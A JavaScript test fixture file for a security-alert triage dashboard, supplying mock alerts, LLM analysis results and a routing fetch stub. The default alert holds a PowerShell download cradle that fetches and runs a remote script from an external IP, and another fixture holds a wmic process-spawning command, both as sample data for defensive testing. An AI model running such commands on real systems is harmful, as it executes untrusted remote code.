import { vi } from "vitest";

/**
 * Test fixtures and a routing `fetch` stub.
 *
 * The shapes here mirror what the backend actually returns (see
 * `backend/app/schemas/`). Keeping them in one place means a backend contract
 * change breaks these fixtures rather than quietly passing tests that assert
 * on a shape the API no longer produces.
 */

export function makeAlert(overrides = {}) {
  return {
    alert_id: "ALRT-1003",
    timestamp: "2025-09-13T22:05:19Z",
    hostname: "SRV-APP-02",
    username: "SYSTEM",
    source_ip: "10.30.2.15",
    process: "powershell.exe",
    command_line:
      "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.44/a.ps1')\"",
    severity: "critical",
    category: "PowerShell Execution",
    description: "Download cradle executing a remote script in memory.",
    latest_classification: null,
    latest_risk_score: null,
    ...overrides,
  };
}

export const BENIGN_ALERT = makeAlert({
  alert_id: "ALRT-1031",
  hostname: "SRV-FILE-01",
  username: "svc_backup",
  process: "robocopy.exe",
  command_line: "robocopy.exe D:\\share E:\\backup /MIR /R:1",
  severity: "low",
  category: "Normal Administrative Activity",
  description: "Scheduled backup job mirroring a file share.",
});

export const SUSPICIOUS_ALERT = makeAlert({
  alert_id: "ALRT-1010",
  hostname: "WKSTN-ENG-05",
  username: "t.almeida",
  process: "wmic.exe",
  command_line: 'wmic process call create "cmd.exe /c calc.exe"',
  severity: "medium",
  category: "Suspicious Command Execution",
  description: "wmic process-call-create used to spawn a child process.",
});

export function makeAnalysis(overrides = {}) {
  const { assessment = {}, retrieval = {}, meta = {}, ...rest } = overrides;
  return {
    alert: makeAlert(),
    assessment: {
      classification: "Malicious",
      risk_score: 88,
      confidence_score: 80,
      reasoning: "SYSTEM-context PowerShell download cradle to an external address.",
      recommended_action:
        "Investigate the process tree and review the network destination before containment.",
      evidence: ["IEX DownloadString in command_line", "external IP 185.220.101.44"],
      unsupported_claims: [],
      validation_warnings: [],
      human_review_required: true,
      human_review_reasons: ["destructive recommendation requires approval"],
      ...assessment,
    },
    retrieval: {
      status: "relevant",
      sufficient: true,
      note: "2 relevant knowledge chunk(s) retrieved.",
      cited_chunk_ids: ["01-powershell-attacks#0"],
      similarity_scores: [0.31],
      documents: [
        {
          chunk_id: "01-powershell-attacks#0",
          title: "PowerShell Attacks",
          category: "PowerShell Execution",
          source: "internal-knowledge-base",
          excerpt: "Download cradles such as IEX DownloadString fetch and run code in memory.",
          score: 0.312,
        },
      ],
      ...retrieval,
    },
    meta: {
      analysis_id: 1,
      analyzed_at: "2025-09-20T10:15:00Z",
      provider: "openai",
      model: "gpt-4o-mini",
      prompt_version: "analysis-v1",
      attempts: 1,
      latency_ms: 2400,
      persisted: true,
      cached: false,
      notes: [],
      ...meta,
    },
    ...rest,
  };
}

export function makeReadiness(overrides = {}) {
  return {
    status: "ok",
    degraded_reasons: [],
    llm_configured: true,
    data_present: true,
    database_ready: true,
    alert_count: 45,
    rag_index_ready: true,
    ...overrides,
  };
}

/** A backend error envelope, exactly as the API returns one. */
export function apiError(code, message, { status = 503, requestId = "req-test-0001" } = {}) {
  return {
    status,
    body: { error: { code, message, request_id: requestId, details: null } },
  };
}

function jsonResponse({ status = 200, body = {}, requestId = "req-test-0001" }) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: { get: (name) => (name.toLowerCase() === "x-request-id" ? requestId : null) },
    json: async () => body,
  };
}

/**
 * Installs a `fetch` stub that routes by path.
 *
 * Each route is either a value (returned as a 200 body), an `apiError(...)`
 * result, or a function receiving `(url, init)` so a test can assert on the
 * request or delay the response.
 *
 *   mockApi({ "/alerts": { total: 1, items: [alert] } })
 *
 * Returns the vi.fn() so tests can assert on the calls that were made.
 */
export function mockApi(routes = {}) {
  const stub = vi.fn(async (url, init = {}) => {
    const { pathname, searchParams } = new URL(url, "http://localhost");
    // Strip the "/api" prefix the client adds, so routes read as backend paths.
    const path = pathname.replace(/^\/api/, "") || "/";

    // Most specific route wins, so "/alerts" does not swallow
    // "/alerts/{id}/analysis" just because it was declared first.
    const match = Object.keys(routes)
      .filter((route) => path === route || path.startsWith(`${route}/`))
      .sort((a, b) => b.length - a.length)[0];
    if (match === undefined) {
      throw new Error(`No mock route for ${path} — add it to mockApi().`);
    }

    let result = routes[match];
    if (typeof result === "function") result = await result({ path, searchParams, init });
    if (result && typeof result === "object" && "status" in result && "body" in result) {
      return jsonResponse(result);
    }
    return jsonResponse({ body: result });
  });

  vi.stubGlobal("fetch", stub);
  return stub;
}

/** The three routes App needs before it will render anything at all. */
export function mockDashboard({ alerts = [makeAlert()], readiness = makeReadiness(), ...extra } = {}) {
  return mockApi({
    "/health/ready": readiness,
    "/alerts": { total: alerts.length, limit: 200, offset: 0, items: alerts },
    ...extra,
  });
}
